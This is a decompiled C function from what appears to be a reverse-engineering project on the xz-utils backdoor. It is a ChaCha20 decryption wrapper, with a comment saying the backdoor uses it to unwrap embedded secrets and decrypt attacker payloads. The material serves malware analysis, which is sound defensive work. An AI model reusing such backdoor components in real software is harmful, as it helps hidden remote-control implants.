// /home/kali/xzre-ghidra/xzregh/107190_chacha_decrypt.c
// Function: chacha_decrypt @ 0x107190
// Calling convention: __stdcall
// Prototype: BOOL __stdcall chacha_decrypt(u8 * in, int inl, u8 * key, u8 * iv, u8 * out, imported_funcs_t * funcs)


/*
 * AutoDoc: Thin wrapper around OpenSSL's ChaCha20 decrypt primitives that operates through the resolved imports table. The backdoor uses it both to unwrap its embedded secrets and to decrypt attacker payloads after they arrive via the monitor channel.
 */
#include "xzre_types.h"


BOOL chacha_decrypt(u8 *in,int inl,u8 *key,u8 *iv,u8 *out,imported_funcs_t *funcs)

{
  pfn_EVP_DecryptInit_ex_t ppVar1;
  BOOL BVar2;
  int iVar3;
  EVP_CIPHER_CTX *ctx_00;
  EVP_CIPHER *type;
  imported_funcs_t *piVar4;
  EVP_CIPHER_CTX *ctx;
  EVP_CIPHER *cipher;
  int outl;
  
  outl = 0;
  if (((((in != (u8 *)0x0) && (inl != 0)) && (iv != (u8 *)0x0)) &&
      ((out != (u8 *)0x0 && (funcs != (imported_funcs_t *)0x0)))) &&
     ((piVar4 = funcs, BVar2 = contains_null_pointers(&funcs->EVP_CIPHER_CTX_new,6), BVar2 == FALSE
      && (ctx_00 = (*piVar4->EVP_CIPHER_CTX_new)(), ctx_00 != (EVP_CIPHER_CTX *)0x0)))) {
    ppVar1 = funcs->EVP_DecryptInit_ex;
    type = (*funcs->EVP_chacha20)();
    iVar3 = (*ppVar1)(ctx_00,type,(ENGINE *)0x0,key,iv);
    if (iVar3 == 1) {
      iVar3 = (*funcs->EVP_DecryptUpdate)(ctx_00,out,&outl,in,inl);
      if (((iVar3 == 1) && (-1 < outl)) &&
         ((iVar3 = (*funcs->EVP_DecryptFinal_ex)(ctx_00,out + outl,&outl), iVar3 == 1 &&
          ((-1 < outl && ((uint)outl <= (uint)inl)))))) {
        (*funcs->EVP_CIPHER_CTX_free)(ctx_00);
        return TRUE;
      }
    }
    if (funcs->EVP_CIPHER_CTX_free != (pfn_EVP_CIPHER_CTX_free_t)0x0) {
      (*funcs->EVP_CIPHER_CTX_free)(ctx_00);
    }
  }
  return FALSE;
}

